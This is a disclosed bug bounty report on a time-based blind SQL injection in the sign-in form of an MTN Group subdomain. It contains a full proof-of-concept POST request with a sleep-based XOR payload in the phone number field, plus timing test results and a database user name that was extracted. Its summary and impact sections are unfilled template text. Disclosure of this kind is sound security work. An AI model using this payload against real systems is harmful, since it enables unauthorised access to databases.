---
tags:
  - type/disclosure
  - platform/hackerone
  - severity/high
  - cwe/sql-injection
  - env/web
substate: "resolved"
weakness: "SQL Injection"
enriched: true
body: true
date: 2021-09-09
submitted: 2020-07-15T21:42:56.696Z
bounty_usd: null
votes: 9
cve: []
program: "[[programs/mtn_group|MTN Group]]"
reporter: "pisarenko"
source: "https://hackerone.com/reports/924855"
title: "SQL injection [futexpert.mtngbissau.com]"
---
# SQL injection [futexpert.mtngbissau.com]

> **Severity:** High | **Bounty:** undisclosed | **Votes:** 9 | **Program:** MTN Group | **Disclosed:** 2021-09-09

- Report: [https://hackerone.com/reports/924855](https://hackerone.com/reports/924855)
- CWE: SQL Injection
- Submitted: 2020-07-15T21:42:56.696Z

## Report summary

Proof of Exploit
SQL query - SELECT user FROM dual
CORPORATEBULKSMS

## Report body

Public report body - fetched from `https://hackerone.com/reports/<id>.json` (the site's own disclosed-report data route).

## Summary:
[add summary of the vulnerability]

## Steps To Reproduce:
[add details for how we can reproduce the issue]

  1. Poc Request

`POST /signin/ HTTP/1.1
Content-Type: application/x-www-form-urlencoded
X-Requested-With: XMLHttpRequest
Referer: https://futexpert.mtngbissau.com/
Cookie: PHPSESSID=sn56alvthfp0l0vvoku34jd2i4
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
Accept-Encoding: gzip,deflate
Content-Length: 82
Host: futexpert.mtngbissau.com
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/73.0.3683.103 Safari/537.36
Connection: Keep-alive`

`phone_number=0'XOR(if(now()=sysdate()%2Csleep(10)%2C0))XOR'Z&pin=1&submit=Continuar`

Tests performed:
0'XOR(if(now()=sysdate(),sleep(15),0))XOR'Z => 15.438
0'XOR(if(now()=sysdate(),sleep(3),0))XOR'Z => 3.394
0'XOR(if(now()=sysdate(),sleep(15),0))XOR'Z => 15.391
0'XOR(if(now()=sysdate(),sleep(6),0))XOR'Z => 6.396
0'XOR(if(now()=sysdate(),sleep(0),0))XOR'Z => 0.802
0'XOR(if(now()=sysdate(),sleep(0),0))XOR'Z => 0.436
0'XOR(if(now()=sysdate(),sleep(6),0))XOR'Z => 6.435

## Impact

sql

## Timeline

- **Report Filed**
- **Report Triaged**
- **Report Resolved**
- **Agreed On Going Public**
- **Report Became Public**
